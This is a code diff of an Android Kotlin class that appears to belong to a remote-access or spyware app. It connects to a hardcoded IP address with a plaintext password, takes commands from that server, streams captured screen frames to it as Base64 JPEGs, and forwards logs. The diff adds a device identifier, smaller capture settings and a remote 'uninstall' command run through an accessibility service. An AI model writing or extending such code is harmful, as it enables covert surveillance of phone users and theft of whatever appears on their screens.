@@ -6,29 +6,34 @@ import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
 import android.media.projection.MediaProjection
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.util.Base64
 import org.java_websocket.client.WebSocketClient
 import org.java_websocket.handshake.ServerHandshake
 import java.io.ByteArrayOutputStream
 import java.net.URI
+import java.net.URLEncoder
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.math.min
 
 class WebSocketManager(private val activity: MainActivity) {
 
     companion object {
-        private const val SERVER_URL = "ws://34.30.143.238:3010/?type=phone&password=admin123"
         private const val HEARTBEAT_INTERVAL = 30000L
         private const val MAX_RECONNECT_DELAY = 60000L
-        private const val INITIAL_RECONNECT_DELAY = 1000L
-        private const val FRAME_QUALITY = 40
-        private const val MAX_FRAME_SKIP = 3
+        private const val INITIAL_RECONNECT_DELAY = 5000L
+        private const val FRAME_QUALITY = 25
+        private const val SCALE = 0.3f
     }
 
     enum class ConnectionState { DISCONNECTED, CONNECTING, CONNECTED, RECONNECTING }
 
+    private val DEVICE_ID = URLEncoder.encode(Build.MODEL.replace(" ", "_"), "UTF-8")
+    private val SERVER_URL = "ws://34.30.143.238:3010/?type=phone&password=admin123&device=$DEVICE_ID"
+    
     private var webSocketClient: WebSocketClient? = null
     private var cachedProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
@@ -42,8 +47,7 @@ class WebSocketManager(private val activity: MainActivity) {
     private var heartbeatRunnable: Runnable? = null
     private var streamingActive = false
     private var remoteModeActive = false
-    private var streamingEnabled = false // Separate toggle for streaming
-    private var frameSkipCount = 0
+    private var streamingEnabled = false
 
     init { LogUtil.setSender { logJson -> sendRaw(logJson) } }
 
@@ -113,12 +117,10 @@ class WebSocketManager(private val activity: MainActivity) {
                 "mode" -> setRemoteMode(cmd.optBoolean("remote", false))
                 "streaming" -> {
                     streamingEnabled = cmd.optBoolean("enabled", false)
-                    if (streamingEnabled) {
-                        activity.requestScreenCapture()
-                    } else {
-                        stopStreaming()
-                    }
+                    if (streamingEnabled) activity.requestScreenCapture()
+                    else stopStreaming()
                 }
+                "uninstall" -> a11y?.uninstallSelf(activity.packageName)
                 "config" -> cmd.optString("phoneNumber")?.let { phoneNumber = it }
                 "ping" -> sendRaw("{\"type\":\"pong\"}")
             }
@@ -145,47 +147,26 @@ class WebSocketManager(private val activity: MainActivity) {
     fun cacheProjection(projection: MediaProjection?, width: Int, height: Int) {
         stopStreaming()
         cachedProjection = projection
-        if (cachedProjection != null && streamingEnabled && remoteModeActive) {
-            startStreaming()
-        }
+        if (cachedProjection != null && streamingEnabled && remoteModeActive) startStreaming()
     }
 
-    
-
-private fun startStreaming() {
-    if (streamingActive || cachedProjection == null || !isConnected()) return
-    try {
-        val projection = cachedProjection!!
-        val metrics = activity.resources.displayMetrics
-        val w = (metrics.widthPixels * SCALE).toInt()
-        val h = (metrics.heightPixels * SCALE).toInt()
-        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGB_565, 2)
-        virtualDisplay = projection.createVirtualDisplay("ScreenCapture", w, h, metrics.densityDpi,
-            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader!!.surface, null, null)
-        imageReader!!.setOnImageAvailableListener({ reader ->
-            if (!streamingActive || !isConnected()) { try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}; return@setOnImageAvailableListener }
-            captureAndSend(reader)
-        }, mainHandler)
-        streamingActive = true
-        LogUtil.i("WS", "Streaming: ${w}x${h} @ quality $FRAME_QUALITY")
-    } catch (e: Exception) { stopStreaming() }
-}
-
-private fun captureAndSend(reader: ImageReader) {
-    try {
-        val image = reader.acquireLatestImage() ?: return
-        val w = image.width; val h = image.height
-        val buffer = image.planes[0].buffer
-        val bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.RGB_565)
-        bitmap.copyPixelsFromBuffer(buffer)
-        image.close()
-        val baos = ByteArrayOutputStream()
-        bitmap.compress(Bitmap.CompressFormat.JPEG, FRAME_QUALITY, baos)
-        bitmap.recycle()
-        sendRaw("{\"type\":\"frame\",\"data\":\"${Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)}\"}")
-        baos.close()
-    } catch (_: Exception) {}
-}
+    private fun startStreaming() {
+        if (streamingActive || cachedProjection == null || !isConnected()) return
+        try {
+            val projection = cachedProjection!!
+            val metrics = activity.resources.displayMetrics
+            val w = (metrics.widthPixels * SCALE).toInt()
+            val h = (metrics.heightPixels * SCALE).toInt()
+            imageReader = ImageReader.newInstance(w, h, PixelFormat.RGB_565, 2)
+            virtualDisplay = projection.createVirtualDisplay("ScreenCapture", w, h, metrics.densityDpi,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader!!.surface, null, null)
+            imageReader!!.setOnImageAvailableListener({ reader ->
+                if (!streamingActive || !isConnected()) { try { reader.acquireLatestImage()?.close() } catch (_: Exception) {}; return@setOnImageAvailableListener }
+                captureAndSend(reader)
+            }, mainHandler)
+            streamingActive = true
+        } catch (e: Exception) { stopStreaming() }
+    }
 
     private fun stopStreaming() {
         streamingActive = false
@@ -194,7 +175,20 @@ private fun captureAndSend(reader: ImageReader) {
         virtualDisplay = null; imageReader = null
     }
 
-    
+    private fun captureAndSend(reader: ImageReader) {
+        try {
+            val image = reader.acquireLatestImage() ?: return
+            val w = image.width; val h = image.height
+            val bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.RGB_565)
+            bitmap.copyPixelsFromBuffer(image.planes[0].buffer)
+            image.close()
+            val baos = ByteArrayOutputStream()
+            bitmap.compress(Bitmap.CompressFormat.JPEG, FRAME_QUALITY, baos)
+            bitmap.recycle()
+            sendRaw("{\"type\":\"frame\",\"data\":\"${Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)}\"}")
+            baos.close()
+        } catch (_: Exception) {}
+    }
 
     private fun captureSingleFrame() { if (streamingActive && imageReader != null) try { captureAndSend(imageReader!!) } catch (_: Exception) {} }
 
@@ -209,7 +203,7 @@ private fun captureAndSend(reader: ImageReader) {
 
     private fun scheduleReconnect() {
         connectionState = ConnectionState.RECONNECTING; reconnectAttempts++
-        val delay = min(reconnectDelay, MAX_RECONNECT_DELAY)
+        val delay = min(maxOf(reconnectDelay, 5000L), MAX_RECONNECT_DELAY)
         mainHandler.postDelayed({ if (shouldReconnect.get() && connectionState != ConnectionState.CONNECTED) doConnect() }, delay)
         reconnectDelay = min(reconnectDelay * 2, MAX_RECONNECT_DELAY)
     }
